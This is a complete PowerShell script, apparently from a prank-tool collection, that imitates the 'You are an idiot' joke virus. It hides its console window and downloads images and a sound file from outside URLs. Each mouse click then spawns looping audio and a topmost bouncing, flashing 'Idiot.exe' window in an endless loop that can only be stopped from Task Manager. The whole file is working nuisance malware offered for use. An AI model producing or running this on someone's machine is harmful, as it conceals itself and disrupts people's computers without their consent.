<# ================================================ WINDOWS IDIOT PRANK ========================================================

SYNOPSIS
This script is a powershell interpretation of the famous windows idiot virus.

USAGE
Run the script
stop in task manager (when console is hidden)

#>

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms


# Hide the Powershell console
$hide = 1
if ($hide -eq 1){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Download sounds and images
iwr -Uri 'https://i.ibb.co/gDVfZ0L/white.jpg' -OutFile "$env:TEMP\white.png"
iwr -Uri 'https://i.ibb.co/0nxjGzH/black.jpg' -OutFile "$env:TEMP\black.png"
iwr -Uri 'https://github.com/beigeworm/assets/raw/main/idiot.wav' -OutFile "$env:TEMP\sound.wav"
sleep 1

Function SpawnImage{

$job1 = {

    while ($true){
        (New-Object Media.SoundPlayer "$env:TEMP\sound.wav").Play();
        sleep 5
    }

}

$job2 = {  

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Idiot.exe"
    $form.Width = 350
    $form.Height = 300
    $form.TopMost = $true
    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\DFDWiz.exe")
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $Width = $screen.Bounds.Width
    $Height = $screen.Bounds.Height
    $X = [math]::Round($Width / 2)
    $Y = [math]::Round($Height / 2)
    
    $form.StartPosition = "Manual"
    $form.Location = [System.Drawing.Point]::new($X - $form.Width / 2, $Y - $form.Height / 2)
    
    $rand = New-Object System.Random
    $dx = $rand.Next(-10, 10)
    $dy = $rand.Next(-10, 10)
    
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 10
    
    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.png")
    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.png")
    
    $images = @($image1, $image2)
    $imageIndex = 0
    $moveCount = 0
    
    function Set-BackgroundImage {
        param (
            [System.Drawing.Image]$image
        )
        $form.BackgroundImage = $image
        $form.BackgroundImageLayout = "Stretch"
    }
    
    $timer.Add_Tick({
        $newX = $form.Location.X + $dx
        $newY = $form.Location.Y + $dy
        if ($newX -lt 0 -or $newX + $form.Width -gt $Width) {
            $script:dx = -$dx
        }
        if ($newY -lt 0 -or $newY + $form.Height -gt $Height) {
            $script:dy = -$dy
        }
        $form.Location = [System.Drawing.Point]::new(
            [Math]::Min([Math]::Max($newX, 0), $Width - $form.Width),
            [Math]::Min([Math]::Max($newY, 0), $Height - $form.Height)
        )
    
        $script:moveCount++
        if ($moveCount -ge 20) {
            $script:moveCount = 0
            $script:imageIndex = ($imageIndex + 1) % $images.Length
            Set-BackgroundImage $images[$imageIndex]
        }
    })
    
    $timer.Start()
    $form.Add_Shown({ $form.Activate() })
    [void]$form.ShowDialog()

}

Start-Job -ScriptBlock $job1
Start-Job -ScriptBlock $job2

}

function MouseState {
    $previousState = [Windows.Forms.Control]::MouseButtons
    while ($true) {
        $currentState = [Windows.Forms.Control]::MouseButtons
        if ($previousState -ne $currentState) {
            Write-Host "Mouse Click Detected!"
            $previousState = $currentState
            SpawnImage
            break
        }
        Start-Sleep -Milliseconds 50
    }
}

while ($true){
    MouseState
    Start-Sleep -Milliseconds 500
}

